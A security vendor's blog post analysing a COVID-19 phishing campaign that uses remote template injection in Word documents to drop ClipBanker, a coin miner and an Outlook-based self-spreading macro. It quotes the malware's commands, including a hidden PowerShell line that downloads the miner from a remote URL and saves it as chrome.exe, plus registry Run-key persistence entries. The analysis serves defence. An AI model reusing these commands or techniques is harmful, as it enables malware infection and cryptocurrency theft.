          <h1>COVID-19 Phishing Lure to Steal and Mine Cryptocurrency</h1>
          
        </div>
        <div class="blog-details-header-right">
          
            
            <a href="#" class="theme-changer">Change theme to light</a>
            
            
            

            
            <div class="hero-spider" role="img" aria-label="COVID-19 Phishing Lure to Steal and Mine Cryptocurrency"></div>
            

            
          
        </div>
      </div>
      <div class="toc-content content-wrapper">
        
        <div class="wrapper-main_content">
          
          <div class="blog-details-metadata ">
            <span class="date-time">
              <time datetime="2021-12-23 06:00:00">December 23, 2021</time>
            </span>
            <span class="minread">2 Minute Read</span>
            
              <span class="blog-author">by Bernard Bautista</span>
            
          </div> 
          
          
          <div class="wrapper-blog-content">
            <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><span>Recently, we observed a malware spam campaign leveraging the current COVID-19 situation. The emails were sent from a compromised mailbox using a mailer script. The message contains a link leading to a Word document. The email takes advantage of a COVID-19 test mandate as a pretext to lure the unsuspecting user into clicking the link and downloading the document.</span></p> 
<!--more-->
<p style="text-align: center; font-size: 14px;"><span><img loading="lazy" alt="COVID-19 themed malspam with link to the malicious document." border="0" src="https://levelblue.com/hubfs/Imported_Blog_Media/6a0133f264aa62970b02788060250d200d-800wi" title="COVID-19 themed malspam with link to the malicious document." style="margin-left: auto; margin-right: auto; display: block;"><em>Figure 1. COVID-19 themed malspam with link to the malicious document.</em></span></p> 
<p style="text-align: center; font-size: 14px;">&nbsp;</p> 
<p><span>&nbsp;</span><span>The initial downloaded Word document has no malicious code. But once the victim opens the Word document, it will try to retrieve a malicious macro-enabled template from a remote server. The technique is known as<a href="https://medium.com/@john.woodman11/vba-macro-remote-template-injection-with-unlinking-self-deletion-49aef5eec0cd" rel="noopener" target="_blank">&nbsp;Remote Template Injection</a>&nbsp;and is commonly used to evade static detection. After loading the remote template, it will then prompt the user in enabling macro content.</span><span></span></p> 
<p style="text-align: center;"><span><em><img loading="lazy" alt="Code snippet of the settings.xml.rels with template referenced to an external target." border="0" src="https://levelblue.com/hubfs/Imported_Blog_Media/6a0133f264aa62970b0282e138b593200b-800wi" title="Code snippet of the settings.xml.rels with template referenced to an external target." style="margin-left: auto; margin-right: auto; display: block;"><span style="font-size: 14px;">Figure 2. Code snippet of the settings.xml.rels with template referenced to an external target.</span></em></span><span><span style="font-size: 14px;"></span></span></p> 
<p style="text-align: center;">&nbsp;</p> 
<p style="text-align: center;"><img loading="lazy" alt="Microsoft Word document lure to enable macro." border="0" src="https://levelblue.com/hubfs/Imported_Blog_Media/6a0133f264aa62970b0282e138b5a4200b-800wi" title="Microsoft Word document lure to enable macro." style="margin-left: auto; margin-right: auto; display: block;"><span style="font-size: 14px;"><em>Figure&nbsp;3. Microsoft Word document lure to enable macro.</em></span></p> 
<p>&nbsp;</p> 
<p><span>The template has Base64 binary files which are contained in the VBA UserForm. These binaries will be decoded and dropped by the custom VBA functions in the template. The binaries that will be dropped are as follows:</span></p> 
<ul> 
 <li><span><em>%APPDATA%\Microsoft\Windows\COM Surrogate\dllhost.exe (ClipBanker)</em></span></li> 
 <li><span><em>C:\cfe91497d9137b2\ffd0.exe (Coinminer downloader)</em></span></li> 
 <li><span><em>%TEMP%\instx.exe (Coinminer loader)</em></span></li> 
 <li><span><em>C:\cfe91497d9137b2\COVID-19.docx (Injected Word document)</em></span></li> 
</ul> 
<p style="text-align: center;"><span><em><a href="https://npercoco.typepad.com/.a/6a0133f264aa62970b02942f8ddf3a200c-pi"><img loading="lazy" alt="VBA UserForm with embedded payloads." border="0" src="https://levelblue.com/hubfs/Imported_Blog_Media/6a0133f264aa62970b02942f8ddf3a200c-800wi" title="VBA UserForm with embedded payloads." style="margin-left: auto; margin-right: auto; display: block;"></a></em></span><span style="font-size: 14px;"><em>Figure 4. VBA UserForm with embedded payloads.</em></span></p> 
<p>&nbsp;</p> 
<p style="text-align: center;"><em><span><img loading="lazy" alt="Infection chain" border="0" src="https://levelblue.com/hubfs/Imported_Blog_Media/6a0133f264aa62970b02942f8ddf79200c-800wi" title="Infection chain" style="margin-left: auto; margin-right: auto; display: block;"><span style="font-size: 14px;">Figure 5. Infection chain</span><br></span></em></p> 
<p>&nbsp;</p> 
<p><span>The first binary dropped is an infostealer known as ClipBanker. This threat monitors the clipboard and replaces cryptocurrency wallet addresses in the infected system with the threat actor’s own. The macro script creates a registry startup key as a form of persistence.</span></p> 
<p style="padding-left: 40px;"><span><code><em><span style="background-color: #f4cccc; color: #b10c2a;">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></em></code></span></p> 
<p style="padding-left: 40px;"><span style="background-color: #f4cccc; color: #b10c2a;"><code><em>[%random%5] = %AppData%\Local\Microsoft\Windows\COM Surrogate\dllhost.exe</em></code></span></p> 
<p>&nbsp;</p> 
<p><span>To begin the mining process, the loader will start the downloader and it will then try to elevate the user privilege. Next, the downloader fetches the main payload from a remote server, a coin miner and its configuration files. The coin miner will then be saved as “chrome.exe” to masquerade itself as a web browser.</span></p> 
<p style="padding-left: 40px;"><span style="background-color: #f4cccc; color: #b10c2a;"><code><em>powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden $ProgressPreference = ',27h,'SilentlyContinue',27h,'; Invoke-WebRequest https://github.com/octopus734/BitcoinLight/releases/download/BitcoinLight/BitcoinLight.dat -OutFile "$env:appdata/Google` Chrome/chrome.exe"</em></code></span></p> 
<p style="padding-left: 40px;">&nbsp;</p> 
<p><span>Also, a registry startup key is added for the persistence of the coin miner.</span></p> 
<p style="padding-left: 40px;"><em><code><span style="background-color: #f4cccc; color: #b10c2a;">REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span></code></em></p> 
<p style="padding-left: 40px;"><span style="background-color: #f4cccc; color: #b10c2a;"><em><code>[%random%] = "%AppData%\Google Chrome\chrome.exe"</code></em></span></p> 
<p><span>The macro-enabled template also embedded a copy of the original Word document in the VBA UserForm. The embedded Word document is dropped at C:/cfe91497d9137b2/COVID-19.docx.</span></p> 
<p><span>The template can propagate itself beyond the infected system. This is done by hijacking the victim’s Outlook application via some macro VBA code, and harvesting the contact list.</span></p> 
<p style="text-align: center; font-size: 14px;"><span><img loading="lazy" alt="Macro script looping through the victim’s inbox collecting sender names and email addresses." border="0" src="https://levelblue.com/hubfs/Imported_Blog_Media/6a0133f264aa62970b0278806025f7200d-800wi" title="Macro script looping through the victim’s inbox collecting sender names and email addresses." style="margin-left: auto; margin-right: auto; display: block;"><em>Figure 6. Macro script looping through the victim’s inbox collecting sender names and email addresses.</em><br></span></p> 
<p>&nbsp;</p> 
<p><span>The macro will then send an email to each of the victim’s contacts with a copy of the COVID-19 themed document as an attachment. With this method, sent emails are likely to be opened and documents downloaded and executed by the recipients as they come from a trusted sender. Finally, the sent emails will be deleted by the macro script in an attempt to cover its tracks and remove evidence.</span></p> 
<p style="text-align: center;"><span><a href="https://npercoco.typepad.com/.a/6a0133f264aa62970b02942f8ddfc9200c-pi"><img loading="lazy" alt="Sending the malicious document to the list of harvested contacts.ure7" border="0" src="https://levelblue.com/hubfs/Imported_Blog_Media/6a0133f264aa62970b02942f8ddfc9200c-800wi" title="Sending the malicious document to the list of harvested contacts.ure7" style="margin-left: auto; margin-right: auto; display: block;"></a></span><span style="font-size: 14px;"><em>Figure 7. Sending the malicious document to the list of harvested contacts.</em></span></p> 
<p>&nbsp;</p> 
<p><span><strong>Summary</strong></span></p> 
<p><span>As we continue to deal with the threats of COVID-19-related malware with the resurgence of a new variant, threat actors are taking advantage of the health scares and uncertainties to deliver malware, harvest credentials, and ultimately, gain financially.</span></p> 
<p><span>The&nbsp;<a href="https://www.trustwave.com/en-us/services/email-security/" target="_blank" rel="noopener">MailMarshal Secure Email Gateway</a>&nbsp;has added protection for this threat for our customers. As usual, we advise all users to avoid clicking on URLs and attachments in unsolicited emails.</span></p>
